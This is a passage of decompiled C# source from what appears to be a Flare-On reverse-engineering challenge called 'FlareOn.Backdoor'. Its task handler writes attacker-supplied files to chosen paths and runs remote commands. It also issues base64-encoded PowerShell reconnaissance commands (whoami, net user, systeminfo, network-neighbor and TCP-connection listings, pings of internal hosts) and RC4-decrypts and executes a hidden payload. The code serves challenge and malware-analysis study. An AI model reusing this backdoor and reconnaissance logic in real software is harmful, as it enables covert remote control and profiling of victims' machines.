using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace FlareOn.Backdoor
{
	// Token: 0x02000023 RID: 35
	public class TaskClass
	{
		// Token: 0x0600008E RID: 142 RVA: 0x000049C4 File Offset: 0x0000B9C4
		public static uint _ComputeStringHash(string s)
		{
			uint num = 0U;
			bool flag = s != null;
			if (flag)
			{
				num = 2166136261U;
				for (int i = 0; i < s.Length; i++)
				{
					num = ((uint)s[i] ^ num) * 16777619U;
				}
			}
			return num;
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00004A14 File Offset: 0x0000BA14
		public static uint ComputeStringHash(string s)
		{
			uint result;
			try
			{
				result = TaskClass._ComputeStringHash(s);
			}
			catch (InvalidProgramException e)
			{
				result = (uint)Util.flare_70(e, new object[]
				{
					s
				});
			}
			return result;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00004A58 File Offset: 0x0000BA58
		public static MachineCommand DoTask()
		{
			MachineCommand result;
			try
			{
				result = TaskClass._DoTask();
			}
			catch (InvalidProgramException e)
			{
				try
				{
					result = (MachineCommand)Util.flare_70(e, null);
				}
				catch (Exception ex)
				{
					result = MachineCommand.Failed;
				}
			}
			return result;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00004AA4 File Offset: 0x0000BAA4
		public static void _ToMaybeWriteFlagToFile(object sender, NotifyCollectionChangedEventArgs e)
		{
			bool flag = e.Action == NotifyCollectionChangedAction.Remove;
			if (flag)
			{
				bool flag2 = TaskClass._someFlag && Util.c.Count == 0;
				if (flag2)
				{
					TaskClass.DecodeAndSaveFlag();
				}
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00004AE4 File Offset: 0x0000BAE4
		public static void ToMaybeWriteFlagToFile(object sender, NotifyCollectionChangedEventArgs f)
		{
			try
			{
				TaskClass._ToMaybeWriteFlagToFile(sender, f);
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, new object[]
				{
					sender,
					f
				});
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00004B28 File Offset: 0x0000BB28
		public static string _ReverseString(string s)
		{
			char[] array = s.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00004B50 File Offset: 0x0000BB50
		public static string ReverseString(string s)
		{
			string result;
			try
			{
				result = TaskClass._ReverseString(s);
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, new object[]
				{
					s
				});
			}
			return result;
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00004B94 File Offset: 0x0000BB94
		public static void _DecodeAndSaveFlag()
		{
			Console.WriteLine("_DecodeAndSaveFlag");
			byte[] sectionContent = Util.FindSectionStartingWithHash(TaskClass.ReverseString(TaskClass.FlagSectionNameHash));
			byte[] hash = TaskClass.CommandsAndMethods.GetHashAndReset();
			byte[] flagContent = FLARE12.RC4(hash, sectionContent);
			string text = Path.GetTempFileName() + Encoding.UTF8.GetString(FLARE12.RC4(hash, new byte[]
			{
				31,
				29,
				40,
				72
			}));
			using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write, FileShare.Read))
			{
				fileStream.Write(flagContent, 0, flagContent.Length);
			}
			Process.Start(text);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00004C34 File Offset: 0x0000BC34
		public static void DecodeAndSaveFlag()
		{
			try
			{
				TaskClass._DecodeAndSaveFlag();
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, null);
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00004C6C File Offset: 0x0000BC6C
		public static void _AppendFlagKeyChunk(int i, string s)
		{
			bool flag = Util.c.Count != 0 && Util.c[0] == (i ^ 248);
			if (flag)
			{
				TaskClass.FlagSectionNameHash += s;
				Util.c.Remove(i ^ 248);
			}
			else
			{
				TaskClass._someFlag = false;
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00004CD0 File Offset: 0x0000BCD0
		public static void AppendFlagKeyChunk(int i, string s)
		{
			try
			{
				TaskClass._AppendFlagKeyChunk(i, s);
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, new object[]
				{
					i,
					s
				});
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00004D1C File Offset: 0x0000BD1C
		public static MachineCommand _DoTask()
		{
			MachineCommand result = MachineCommand.Failed;
			try
			{
				bool flag = TaskClass.ListData.Count > 0 && TaskClass.ListData[0] != null;
				if (flag)
				{
					byte[] array = TaskClass.ListData[0];
					Enums.TaskType taskType = (Enums.TaskType)array[0];
					byte[] array2 = array.Skip(1).ToArray<byte>();
					byte[] resultData = null;
					bool flag2 = taskType == Enums.TaskType.File || taskType == Enums.TaskType.CompressedFile;
					if (flag2)
					{
						string s;
						try
						{
							bool flag3 = taskType == Enums.TaskType.CompressedFile;
							if (flag3)
							{
								array2 = FLARE04._Decompress(array2);
							}
							int num = Array.IndexOf<byte>(array2, 124);
							File.WriteAllBytes(Encoding.UTF8.GetString(array2.Take(num).ToArray<byte>()), array2.Skip(num + 1).ToArray<byte>());
							s = ":)";
						}
						catch (Exception ex)
						{
							s = ex.Message;
						}
						resultData = Encoding.UTF8.GetBytes(s);
					}
					else
					{
						bool flag4 = taskType == Enums.TaskType.CompressedCmd;
						if (flag4)
						{
							array2 = FLARE04._Decompress(array2);
						}
						string cmd = Encoding.UTF8.GetString(array2);
						Thread thread = new Thread(delegate()
						{
							string text = cmd;
							Console.WriteLine("Cmd: {0}", text);
							bool flag9 = taskType == Enums.TaskType.Static;
							if (flag9)
							{
								uint num2 = TaskClass.ComputeStringHash(text);
								bool flag10 = num2 <= 518729469U;
								if (flag10)
								{
									bool flag11 = num2 <= 434841374U;
									if (flag11)
									{
										bool flag12 = num2 <= 350953279U;
										if (flag12)
										{
											bool flag13 = num2 != 334175660U;
											if (flag13)
											{
												bool flag14 = num2 == 350953279U;
												if (flag14)
												{
													bool flag15 = text == "19";
													if (flag15)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "146");
														//$(ping -n 1 10.65.45.3 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.4.52 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.31.155 | findstr /i ttl) -eq $null;$(ping -n 1 flare-on.com | findstr /i ttl) -eq $null
														text = Cmd.Powershell("JChwaW5nIC1uIDEgMTAuNjUuNDUuMyB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuNC41MiB8IGZpbmRzdHIgL2kgdHRsKSAtZXEgJG51bGw7JChwaW5nIC1uIDEgMTAuNjUuMzEuMTU1IHwgZmluZHN0ciAvaSB0dGwpIC1lcSAkbnVsbDskKHBpbmcgLW4gMSBmbGFyZS1vbi5jb20gfCBmaW5kc3RyIC9pIHR0bCkgLWVxICRudWxs");
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag16 = text == "18";
												if (flag16)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "939");
													//$.(.p.i.n.g. .-.n. .1. .1.0...1.0...2.2...4.2. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...2.3...2.0.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...4.5...1.9. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...1.9...5.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
													text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgAyAC4ANAAyACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAyADMALgAyADAAMAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4ANAA1AC4AMQA5ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADkALgA1ADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
										else
										{
											bool flag17 = num2 != 401286136U;
											if (flag17)
											{
												bool flag18 = num2 != 418063755U;
												if (flag18)
												{
													bool flag19 = num2 == 434841374U;
													if (flag19)
													{
														bool flag20 = text == "16";
														if (flag20)
														{
															TaskClass.AppendFlagKeyChunk(int.Parse(text), "e87");
															//$.(.p.i.n.g. .-.n. .1. .1.0...6.5...5.1...1.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...6...1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...5.2...2.0.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...6...3. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
															text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAxAC4AMQAxACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgA2AC4AMQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAyAC4AMgAwADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADYALgAzACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
															TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
														}
													}
												}
												else
												{
													bool flag21 = text == "15";
													if (flag21)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "197");
														//$.(.p.i.n.g. .-.n. .1. .1.0...1.0...1.0...4. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...5.0...1.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...2.2...5.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...4.5...1.9. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
														text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMQAwAC4ANAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4ANQAwAC4AMQAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAyADIALgA1ADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADEAMAAuADQANQAuADEAOQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsAA==");
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag22 = text == "14";
												if (flag22)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "3a7");
													//$.(.p.i.n.g. .-.n. .1. .1.0...1.0...2.1...2.0.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...1.9...2.0.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...1.9...2.0.2. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...1.0...2.4...2.0.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
													text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgAxAC4AMgAwADEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADEAMAAuADEAOQAuADIAMAAxACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADkALgAyADAAMgAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4AMQAwAC4AMgA0AC4AMgAwADAAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA=");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
									}
									else
									{
										bool flag23 = num2 <= 468396612U;
										if (flag23)
										{
											bool flag24 = num2 != 451618993U;
											if (flag24)
											{
												bool flag25 = num2 == 468396612U;
												if (flag25)
												{
													bool flag26 = text == "10";
													if (flag26)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "f38");
														text = "hostname";
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag27 = text == "17";
												if (flag27)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "2e4");
													//$.(.p.i.n.g. .-.n. .1. .1.0...6.5...4.5...1.8. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...2.8...4.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...3.6...1.3. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...5.1...1.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
													text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAA1AC4AMQA4ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgAyADgALgA0ADEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADMANgAuADEAMwAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAxAC4AMQAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
										else
										{
											bool flag28 = num2 != 485174231U;
											if (flag28)
											{
												bool flag29 = num2 != 501951850U;
												if (flag29)
												{
													bool flag30 = num2 == 518729469U;
													if (flag30)
													{
														bool flag31 = text == "13";
														if (flag31)
														{
															TaskClass.AppendFlagKeyChunk(int.Parse(text), "e38");
															//nslookup flare-on.com | findstr /i Address;nslookup webmail.flare-on.com | findstr /i Address
															text = Cmd.Powershell("bnNsb29rdXAgZmxhcmUtb24uY29tIHwgZmluZHN0ciAvaSBBZGRyZXNzO25zbG9va3VwIHdlYm1haWwuZmxhcmUtb24uY29tIHwgZmluZHN0ciAvaSBBZGRyZXNz");
															TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
														}
													}
												}
												else
												{
													bool flag32 = text == "12";
													if (flag32)
													{
													
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "570");
														//$.(.p.i.n.g. .-.n. .1. .1.0...6.5...4...5.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...4...5.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...6.5...6.5. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...5.3...5.3. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...2.1...2.0.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.
														text = Cmd.Powershell("JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMAAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAAuADUAMQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANgA1AC4ANgA1ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgA1ADMALgA1ADMAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADIAMQAuADIAMAAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA");
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag33 = text == "11";
												if (flag33)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "818");
													//G.e.t.-.N.e.t.T.C.P.C.o.n.n.e.c.t.i.o.n. .|. .W.h.e.r.e.-.O.b.j.e.c.t. .{.$._...S.t.a.t.e. .-.e.q. .".E.s.t.a.b.l.i.s.h.e.d.".}. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .".L.o.c.a.l.A.d.d.r.e.s.s.".,. .".L.o.c.a.l.P.o.r.t.".,. .".R.e.m.o.t.e.A.d.d.r.e.s.s.".,. .".R.e.m.o.t.e.P.o.r.t.".
													text = Cmd.Powershell("RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBTAHQAYQB0AGUAIAAtAGUAcQAgACIARQBzAHQAYQBiAGwAaQBzAGgAZQBkACIAfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAIgBMAG8AYwBhAGwAQQBkAGQAcgBlAHMAcwAiACwAIAAiAEwAbwBjAGEAbABQAG8AcgB0ACIALAAgACIAUgBlAG0AbwB0AGUAQQBkAGQAcgBlAHMAcwAiACwAIAAiAFIAZQBtAG8AdABlAFAAbwByAHQAIgA=");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
									}
								}
								else
								{
									bool flag34 = num2 <= 906799682U;
									if (flag34)
									{
										bool flag35 = num2 <= 822911587U;
										if (flag35)
										{
											bool flag36 = num2 != 806133968U;
											if (flag36)
											{
												bool flag37 = num2 == 822911587U;
												if (flag37)
												{
													bool flag38 = text == "4";
													if (flag38)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "ea5");
														//[.S.y.s.t.e.m...E.n.v.i.r.o.n.m.e.n.t.].:.:.O.S.V.e.r.s.i.o.n...V.e.r.s.i.o.n.S.t.r.i.n.g.
														text = Cmd.Powershell("WwBTAHkAcwB0AGUAbQAuAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AUwB0AHIAaQBuAGcA");
													}
												}
											}
											else
											{
												bool flag39 = text == "5";
												if (flag39)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "bfb");
													text = "net user";
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
										else
										{
											bool flag40 = num2 != 839689206U;
											if (flag40)
											{
												bool flag41 = num2 != 873244444U;
												if (flag41)
												{
													bool flag42 = num2 == 906799682U;
													if (flag42)
													{
														bool flag43 = text == "3";
														if (flag43)
														{
															TaskClass.AppendFlagKeyChunk(int.Parse(text), "113");
															text = "whoami";
															TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
														}
													}
												}
												else
												{
													bool flag44 = text == "1";
													if (flag44)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "c2e");
														//G.e.t.-.N.e.t.I.P.A.d.d.r.e.s.s. .-.A.d.d.r.e.s.s.F.a.m.i.l.y. .I.P.v.4. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .I.P.A.d.d.r.e.s.s.
														text = Cmd.Powershell("RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwAgAC0AQQBkAGQAcgBlAHMAcwBGAGEAbQBpAGwAeQAgAEkAUAB2ADQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEkAUABBAGQAZAByAGUAcwBzAA==");
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag45 = text == "7";
												if (flag45)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "b");
													//G.e.t.-.C.h.i.l.d.I.t.e.m. .-.P.a.t.h. .".C.:.\.P.r.o.g.r.a.m. .F.i.l.e.s.". .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .N.a.m.e.
													text = Cmd.Powershell("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAiACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABOAGEAbQBlAA==");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
									}
									else
									{
										bool flag46 = num2 <= 1024243015U;
										if (flag46)
										{
											bool flag47 = num2 != 923577301U;
											if (flag47)
											{
												bool flag48 = num2 != 1007465396U;
												if (flag48)
												{
													bool flag49 = num2 == 1024243015U;
													if (flag49)
													{
														bool flag50 = text == "8";
														if (flag50)
														{
															TaskClass.AppendFlagKeyChunk(int.Parse(text), "2b7");
															//G.e.t.-.C.h.i.l.d.I.t.e.m. .-.P.a.t.h. .'.C.:.\.P.r.o.g.r.a.m. .F.i.l.e.s. .(.x.8.6.).'. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .N.a.m.e.
															text = Cmd.Powershell("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQAnACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABOAGEAbQBlAA==");
															TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
														}
													}
												}
												else
												{
													bool flag51 = text == "9";
													if (flag51)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "9b2");
														//G.e.t.-.C.h.i.l.d.I.t.e.m. .-.P.a.t.h. .'.C.:.'. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .N.a.m.e.
														text = Cmd.Powershell("RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6ACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAE4AYQBtAGUA");
														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag52 = text == "2";
												if (flag52)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "d7d");
													//G.e.t.-.N.e.t.N.e.i.g.h.b.o.r. .-.A.d.d.r.e.s.s.F.a.m.i.l.y. .I.P.v.4. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .".I.P.A.D.D.r.e.s.s.".
													text = Cmd.Powershell("RwBlAHQALQBOAGUAdABOAGUAaQBnAGgAYgBvAHIAIAAtAEEAZABkAHIAZQBzAHMARgBhAG0AaQBsAHkAIABJAFAAdgA0ACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAiAEkAUABBAEQARAByAGUAcwBzACIA");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
										else
										{
											bool flag53 = num2 != 2364708844U;
											if (flag53)
											{
												bool flag54 = num2 != 2381486463U;
												if (flag54)
												{
													bool flag55 = num2 == 2415041701U;
													if (flag55)
													{
														bool flag56 = text == "22";
														if (flag56)
														{
															TaskClass.AppendFlagKeyChunk(int.Parse(text), "709");
															text = "systeminfo | findstr /i \"Domain\"";
															TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
														}
													}
												}
												else
												{
													bool flag57 = text == "20";
													if (flag57)
													{
														TaskClass.AppendFlagKeyChunk(int.Parse(text), "3c9974");
														//G.e.t.-.N.e.t.I.P.C.o.n.f.i.g.u.r.a.t.i.o.n. .|. .F.o.r.e.a.c.h. .I.P.v.4.D.e.f.a.u.l.t.G.a.t.e.w.a.y. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .N.e.x.t.H.o.p.
														text = Cmd.Powershell("RwBlAHQALQBOAGUAdABJAFAAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAHwAIABGAG8AcgBlAGEAYwBoACAASQBQAHYANABEAGUAZgBhAHUAbAB0AEcAYQB0AGUAdwBhAHkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAE4AZQB4AHQASABvAHAA");
